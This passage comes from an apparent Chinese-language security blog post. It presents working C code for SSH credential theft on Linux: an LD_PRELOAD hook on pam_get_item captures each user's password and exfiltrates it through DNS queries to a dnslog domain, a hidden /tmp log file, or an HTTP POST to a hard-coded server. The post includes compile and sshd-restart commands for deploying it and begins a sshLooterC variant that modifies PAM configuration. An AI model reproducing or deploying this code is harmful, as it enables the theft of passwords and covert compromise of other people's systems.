class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line">u_char* <span class="title function_">ReadName</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* reader,<span class="type">unsigned</span> <span class="type">char</span>* buffer,<span class="type">int</span>* count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> p=<span class="number">0</span>,jumped=<span class="number">0</span>,offset;</span><br><span class="line">    <span class="type">int</span> i , j;</span><br><span class="line"></span><br><span class="line">    *count = <span class="number">1</span>;</span><br><span class="line">    name = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    name[<span class="number">0</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//read the names in 3www6google3com format</span></span><br><span class="line">    <span class="keyword">while</span>(*reader!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*reader&gt;=<span class="number">192</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            offset = (*reader)*<span class="number">256</span> + *(reader+<span class="number">1</span>) - <span class="number">49152</span>; <span class="comment">//49152 = 11000000 00000000 ;)</span></span><br><span class="line">            reader = buffer + offset - <span class="number">1</span>;</span><br><span class="line">            jumped = <span class="number">1</span>; <span class="comment">//we have jumped to another location so counting wont go up!</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            name[p++]=*reader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        reader = reader+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(jumped==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *count = *count + <span class="number">1</span>; <span class="comment">//if we havent jumped to another location then we can count up</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    name[p]=<span class="string">&#x27;\0&#x27;</span>; <span class="comment">//string complete</span></span><br><span class="line">    <span class="keyword">if</span>(jumped==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *count = *count + <span class="number">1</span>; <span class="comment">//number of steps we actually moved forward in the packet</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now convert 3www6google3com0 to www.google.com</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;(<span class="type">int</span>)<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)name);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=name[i];</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;(<span class="type">int</span>)p;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            name[i]=name[i+<span class="number">1</span>];</span><br><span class="line">            i=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        name[i]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    name[i<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>; <span class="comment">//remove the last dot</span></span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get the DNS servers from /etc/resolv.conf file on Linux</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_dns_servers</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">200</span>] , *p;</span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">&quot;/etc/resolv.conf&quot;</span> , <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed opening /etc/resolv.conf file \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(fgets(line , <span class="number">200</span> , fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line , <span class="string">&quot;nameserver&quot;</span> , <span class="number">10</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            p = strtok(line , <span class="string">&quot; &quot;</span>);</span><br><span class="line">            p = strtok(<span class="literal">NULL</span> , <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//p now is the dns ip :)</span></span><br><span class="line">            <span class="comment">//????</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(dns_servers[<span class="number">0</span>] , <span class="string">&quot;208.67.222.222&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dns_servers[<span class="number">1</span>] , <span class="string">&quot;208.67.220.220&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This will convert www.google.com to 3www6google3com</span></span><br><span class="line"><span class="comment"> * got it :)</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ChangetoDnsNameFormat</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* dns,<span class="type">unsigned</span> <span class="type">char</span>* host)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> lock = <span class="number">0</span> , i;</span><br><span class="line">    <span class="built_in">strcat</span>((<span class="type">char</span>*)host,<span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="built_in">strlen</span>((<span class="type">char</span>*)host) ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(host[i]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *dns++ = i-lock;</span><br><span class="line">            <span class="keyword">for</span>(;lock&lt;i;lock++)</span><br><span class="line">            &#123;</span><br><span class="line">                *dns++=host[lock];</span><br><span class="line">            &#125;</span><br><span class="line">            lock++; <span class="comment">//or lock=i+1;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *dns++=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------</span></span><br><span class="line"><span class="comment">// pam_get_item劫持部分</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*orig_ftype)</span> <span class="params">(<span class="type">const</span> <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> item_type,  <span class="type">const</span> <span class="type">void</span> **item)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//orig_ftype定义为dlsym返回动态链接库的函数指针，就是原pam_get_item函数的位置。 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pam_get_item</span><span class="params">(<span class="type">const</span> <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> item_type, <span class="type">const</span> <span class="type">void</span> **item)</span> &#123;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    orig_ftype orig_pam; </span><br><span class="line">    orig_pam = (orig_ftype)dlsym(RTLD_NEXT, <span class="string">&quot;pam_get_item&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call original function  so we log password</span></span><br><span class="line">    retval = orig_pam(pamh, item_type, item);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log credential</span></span><br><span class="line">    <span class="keyword">if</span> (item_type == PAM_AUTHTOK &amp;&amp; retval == PAM_SUCCESS &amp;&amp; *item != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> hostname[<span class="number">256</span>];</span><br><span class="line">        get_dns_servers();</span><br><span class="line">        pam_get_user((<span class="type">pam_handle_t</span> *)pamh, &amp;name, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">snprintf</span>(hostname, <span class="keyword">sizeof</span>(hostname), <span class="string">&quot;%s.%s.你的.dnslog.cn&quot;</span>, name, *item); <span class="comment">// Change it with your domain</span></span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            ngethostbyname(hostname, T_A);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apt install libpam0g-dev <span class="comment">#pam相关头文件</span></span><br><span class="line">gcc -fPIC -sharded pam_dns.c -o test.so</span><br><span class="line">pkill sshd</span><br><span class="line"><span class="built_in">export</span> LD_PRELOAD=/root/test.so <span class="comment">#加载到全局动态链接 或者LD_PRELOAD=/root/test.so /usr/sbin/sshd -D &amp;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">/usr/sbin/sshd -D &amp; <span class="comment">#启动sshd</span></span><br><span class="line"><span class="built_in">unset</span> LD_PRELOAD <span class="comment">#还原动态链接</span></span><br><span class="line"><span class="comment">#如果出现Missing privilege separation directory: /run/sshd</span></span><br><span class="line"><span class="comment">#sudo mkdir /run/sshd</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220317-13:30:07-_i0wFyj_image-20220317133007534_i0wFyj_1647495007937_i0wFyj_image-20220317133007534.png" alt="image-20220317133007534"></p>
<p><img src="https://images.atsud0.me/images/post/20220317-12:56:14-_8uqW8W_image-20220317125614053_8uqW8W_1647492974484_8uqW8W_image-20220317125614053.png" alt="image-20220317125614053"></p>
<p><img src="https://images.atsud0.me/images/post/20220317-12:59:19-_8d47Uz_image-20220317125919278_8d47Uz_1647493159831_8d47Uz_image-20220317125919278.png" alt="image-20220317125919278"></p>
<p>稍微改改源码就能实现记录本地密码的方式了.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">typedef int (*orig_ftype) (const pam_handle_t *pamh, int item_type,  const void **item);</span><br><span class="line"></span><br><span class="line">int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) &#123;</span><br><span class="line">    int retval;</span><br><span class="line">    int pid;</span><br><span class="line">    const char *name;</span><br><span class="line">    orig_ftype orig_pam;</span><br><span class="line">    orig_pam = (orig_ftype)dlsym(RTLD_NEXT, &quot;pam_get_item&quot;);</span><br><span class="line"></span><br><span class="line">    // Call original function  so we log password</span><br><span class="line">    retval = orig_pam(pamh, item_type, item);</span><br><span class="line"></span><br><span class="line">    // Log credential</span><br><span class="line">    if (item_type == PAM_AUTHTOK &amp;&amp; retval == PAM_SUCCESS &amp;&amp; *item != NULL) &#123;</span><br><span class="line">        get_dns_servers();</span><br><span class="line">        pam_get_user((pam_handle_t *)pamh, &amp;name, NULL);</span><br><span class="line">        FILE *fp;</span><br><span class="line">        fp = open(&quot;/tmp/.pam.log&quot;, &quot;a&quot;);</span><br><span class="line">        fprintf(fp,&quot;username:%s,password:%s\n&quot;,name,*item);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/20220317-15:53:12-_CbcWJS_image-20220317155312451_CbcWJS_1647503592810_CbcWJS_image-20220317155312451.png" alt="image-20220317155312451"></p>
<p>简单改改实现的http发送(Demo 后续有空学学C再来优化)(搞不明白为什么curl不行):</p>
<p>http实现部分来自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/LLoU8MkR40">csdn c实现post请求</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by atsud0 on 2022/3/17.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//DNS Query Program on Linux</span></span><br><span class="line"><span class="comment">//Author : Silver Moon (m00n.silv3r@gmail.com)</span></span><br><span class="line"><span class="comment">//Dated : 29/4/2009</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Header Files</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>    <span class="comment">//strlen</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>    <span class="comment">//malloc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span>    <span class="comment">//you know what this is for</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span> <span class="comment">//inet_addr , inet_ntoa , ntohs etc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>    <span class="comment">//getpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modules.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modutil.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_appl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPSTR <span class="string">&quot;10.1.1.11&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_data</span><span class="params">(<span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> size * nmemb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sendHttp</span><span class="params">(<span class="type">char</span> (*messgae)[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> sockfd, ret, i, h;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">    <span class="type">char</span> str1[<span class="number">4096</span>],str2[<span class="number">4096</span>],buf[BUFSIZE],*str;</span><br><span class="line">    <span class="type">socklen_t</span> len;</span><br><span class="line">    fd_set   t_set1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">tv</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    bzero(&amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">    servaddr.sin_family = AF_INET;</span><br><span class="line">    servaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, IPSTR, &amp;servaddr.sin_addr) &lt;= <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;inet_pton error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (connect(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connected\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(str2, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str2, *messgae);</span><br><span class="line">    str=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>(str2);</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(str1, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;POST /webservices/qqOnlineWebService.asmx/qqCheckOnline HTTP/1.1\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;Host: 10.1.1.10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, str);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//str2的值为post的数据</span></span><br><span class="line">    <span class="built_in">strcat</span>(str1, str2);</span><br><span class="line">    <span class="built_in">strcat</span>(str1, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str1);</span><br><span class="line"></span><br><span class="line">    ret = write(sockfd,str1,<span class="built_in">strlen</span>(str1));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send failed,fail code : %d，message : &#x27;%s&#x27;\n&quot;</span>,errno, strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FD_ZERO(&amp;t_set1);</span><br><span class="line">    FD_SET(sockfd, &amp;t_set1);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*orig_ftype)</span> <span class="params">(<span class="type">const</span> <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> item_type,  <span class="type">const</span> <span class="type">void</span> **item)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pam_get_item</span><span class="params">(<span class="type">const</span> <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> item_type, <span class="type">const</span> <span class="type">void</span> **item)</span> &#123;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    orig_ftype orig_pam;</span><br><span class="line">    orig_pam = (orig_ftype)dlsym(RTLD_NEXT, <span class="string">&quot;pam_get_item&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call original function  so we log password</span></span><br><span class="line">    retval = orig_pam(pamh, item_type, item);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log credential</span></span><br><span class="line">    <span class="keyword">if</span> (item_type == PAM_AUTHTOK &amp;&amp; retval == PAM_SUCCESS &amp;&amp; *item != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> hostname[<span class="number">256</span>];</span><br><span class="line">        <span class="type">char</span> message[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//get_dns_servers();</span></span><br><span class="line">        pam_get_user((<span class="type">pam_handle_t</span> *)pamh, &amp;name, <span class="literal">NULL</span>);</span><br><span class="line">        gethostname(hostname,<span class="keyword">sizeof</span> hostname);</span><br><span class="line">        <span class="built_in">snprintf</span>(message,<span class="number">2048</span>, <span class="string">&quot;Hostname: %s\n Username: %s \n Password: %s \n&quot;</span>, hostname, name, *item); <span class="comment">// Change it with your domain</span></span><br><span class="line">        sendHttp(&amp;message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220317-20:17:02-_1SVj1A_image-20220317201653006_1SVj1A_1647519422568_1SVj1A_image-20220317201653006.png" alt="image-20220317201653006"></p>
<p>这种方式的优点在于不需要去修改认证文件。。而且这里我们是否可以修改成反弹shell呢？</p>
<h2 id="sshLooterC"><a href="#sshLooterC" class="headerlink" title="sshLooterC"></a>sshLooterC</h2><p>这个方式其实是修改<code>/etc/pam.d/common-auth </code>实现认证时调用恶意的so文件,然后会将内容发送到远端服务器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_appl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modules.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_data</span><span class="params">(<span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> size * nmemb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sendMessage</span><span class="params">(<span class="type">char</span> (*message)[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> url[<span class="number">500</span>];</span><br><span class="line">  <span class="type">char</span> data[<span class="number">200</span>];</span><br><span 